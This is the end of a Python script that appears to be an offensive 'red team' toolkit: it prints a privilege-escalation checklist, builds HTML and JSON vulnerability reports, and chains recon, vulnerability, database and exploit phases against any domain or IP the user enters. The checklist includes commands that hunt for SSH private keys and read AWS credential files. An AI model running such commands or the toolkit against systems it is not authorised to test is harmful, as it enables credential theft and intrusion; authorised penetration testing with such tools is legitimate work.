    for check,cmd in [("SUID","find / -perm -4000 -type f 2>/dev/null"),("sudo -l","sudo -l 2>/dev/null"),
        ("Cron","ls -la /etc/cron* 2>/dev/null"),("Kernel","uname -a"),("SSH Keys","find / -name id_rsa 2>/dev/null"),
        ("Docker","docker ps 2>/dev/null"),("AWS Keys","cat ~/.aws/credentials 2>/dev/null")]:
        print(f"    {c(check+':',C)} {cmd}")

# ─── REPORTING ───────────────────────────────────────────────────
def generate_report(domain):
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 6: REPORTING',BOLD)}")
    print(f"{c('='*65,Y)}")

    # Count severities
    for v in REPORT["vulnerabilities"]:
        s = v.get("severity","INFO").upper()
        if s in REPORT["summary"]: REPORT["summary"][s] += 1
        REPORT["summary"]["total"] += 1

    s = REPORT["summary"]
    print(f"""
  {c('╔════════════════════════════════════════════════════╗',Y)}
  {c('║',Y)}  {c('📊 FINAL SUMMARY',BOLD)}                           {c('║',Y)}
  {c('╠════════════════════════════════════════════════════╣',Y)}
  {c('║',Y)}  Target:  {c(domain,W)}                     {c('║',Y)}
  {c('║',Y)}  CVEs:    {c(str(len(REPORT['cves'])),W)}                       {c('║',Y)}
  {c('║',Y)}  Vulns:   {c(str(s['total']),W)}                       {c('║',Y)}
  {c('║',Y)}  Critical:{c(str(s['critical']),R)}                          {c('║',Y)}
  {c('║',Y)}  High:    {c(str(s['high']),R)}                          {c('║',Y)}
  {c('║',Y)}  Medium:  {c(str(s['medium']),Y)}                          {c('║',Y)}
  {c('╚════════════════════════════════════════════════════╝',Y)}""")

    # Save HTML
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    port_str = ", ".join(REPORT.get("ports",[])[:10])
    cve_rows = "".join(f'<tr><td>{cv["port"]}</td><td>{cv["software"]}</td><td>{cv["version"]}</td><td class="sev-{cv["severity"]}">{cv["cve"]}</td><td class="sev-{cv["severity"]}">{cv["severity"]}</td></tr>' for cv in REPORT["cves"][:50])
    vuln_rows = "".join(f'<tr><td>{v["name"][:60]}</td><td class="sev-{v["severity"]}">{v["severity"]}</td><td>{v.get("url","")[:60]}</td></tr>' for v in REPORT["vulnerabilities"][:50])
    html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>RToolkit Report - {domain}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}} body{{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}}
.container{{max-width:1200px;margin:0 auto}} .header{{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #30363d;border-radius:8px;padding:30px;margin-bottom:24px;text-align:center}}
.header h1{{color:#ff6b6b;font-size:28px}} .header .target{{color:#58a6ff;font-size:18px}}
.stats{{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin-bottom:24px}}
.stat-box{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;text-align:center}}
.stat-box .num{{font-size:32px;font-weight:bold}} .stat-box .label{{font-size:12px;color:#8b949e}}
.section{{background:#161b22;border:1px solid #30363d;border-radius:8px;margin-bottom:20px}}
.section h2{{background:#1c2128;padding:12px 20px;font-size:16px;border-bottom:1px solid #30363d;color:#58a6ff}}
.section-content{{padding:16px 20px}} table{{width:100%;border-collapse:collapse}}
th{{text-align:left;padding:8px 12px;font-size:12px;text-transform:uppercase;color:#8b949e;border-bottom:1px solid #30363d}}
td{{padding:8px 12px;border-bottom:1px solid #21262d;font-size:13px}}
tr:hover{{background:#1c2128}} .sev-CRITICAL{{color:#ff6b6b;font-weight:bold}} .sev-HIGH{{color:#ff6b6b;font-weight:bold}}
.sev-MEDIUM{{color:#d29922;font-weight:bold}} .sev-LOW{{color:#58a6ff}}
</style></head><body><div class="container">
<div class="header"><h1>RToolkit-Kali v3.0 Report</h1><div class="target">{domain}</div><div style="color:#8b949e;font-size:14px">Generated: {REPORT['timestamp']}</div></div>
<div class="stats">
<div class="stat-box"><div class="num" style="color:#ff6b6b">{s["critical"]}</div><div class="label">Critical</div></div>
<div class="stat-box"><div class="num" style="color:#ff6b6b">{s["high"]}</div><div class="label">High</div></div>
<div class="stat-box"><div class="num" style="color:#d29922">{s["medium"]}</div><div class="label">Medium</div></div>
<div class="stat-box"><div class="num" style="color:#58a6ff">{s["low"]}</div><div class="label">Low</div></div>
<div class="stat-box"><div class="num" style="color:#8b949e">{s["total"]}</div><div class="label">Total Vulns</div></div>
</div>
<div class="section"><h2>Services & Open Ports</h2><div class="section-content"><p>{port_str}</p></div></div>
<div class="section"><h2>CVEs ({len(REPORT['cves'])})</h2><div class="section-content"><table><tr><th>Port</th><th>Software</th><th>Version</th><th>CVE</th><th>Severity</th></tr>{cve_rows}</table></div></div>
<div class="section"><h2>Vulnerabilities ({len(REPORT['vulnerabilities'])})</h2><div class="section-content"><table><tr><th>Name</th><th>Severity</th><th>URL</th></tr>{vuln_rows}</table></div></div>
</div></body></html>"""
    html_fn = f"RToolkit_Report_{domain.replace('.','_')}_{ts}.html"
    with open(html_fn,"w",encoding="utf-8") as f: f.write(html)
    json_fn = f"RToolkit_Report_{domain.replace('.','_')}_{ts}.json"
    with open(json_fn,"w") as f: json.dump(REPORT,f,indent=2,default=str)
    print(f"\n  {c(f'📄 HTML: {html_fn}',G)}")
    print(f"  {c(f'📄 JSON: {json_fn}',G)}")

# ─── MAIN ────────────────────────────────────────────────────────
def main():
    banner()
    RESULTS_DIR.mkdir(exist_ok=True)

    target = input(f"\n  {c('Target (domain or IP)',C)}: ").strip()
    if not target: return
    domain = target.replace('https://','').replace('http://','').split('/')[0].split('?')[0]
    REPORT["target"] = domain
    REPORT["timestamp"] = datetime.datetime.now().isoformat()

    print(f"\n  {c('╔═══════════════════════════════════════════╗',Y)}")
    print(f"  {c('║',Y)}  {c('MASTER RED TEAM TOOL',BOLD)}           {c('║',Y)}")
    print(f"  {c('╚═══════════════════════════════════════════╝',Y)}")
    print(f"  Target: {c(domain,W)}")

    tools = phase_recon(domain)
    phase_dirs(domain)
    phase_vuln(domain, tools)
    phase_db(domain)
    phase_exploit(domain)
    generate_report(domain)

    print(f"\n  {c('✅ Full engagement complete!',G)}")
    print(f"  {c('Output di',C)} {RESULTS_DIR}/")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n\n  {c('[!] Interrupted',Y)}"); sys.exit(0)
    except Exception as e: print(f"\n  {c(f'[!] Error: {e}',R)}"); import traceback; traceback.print_exc(); sys.exit(1)
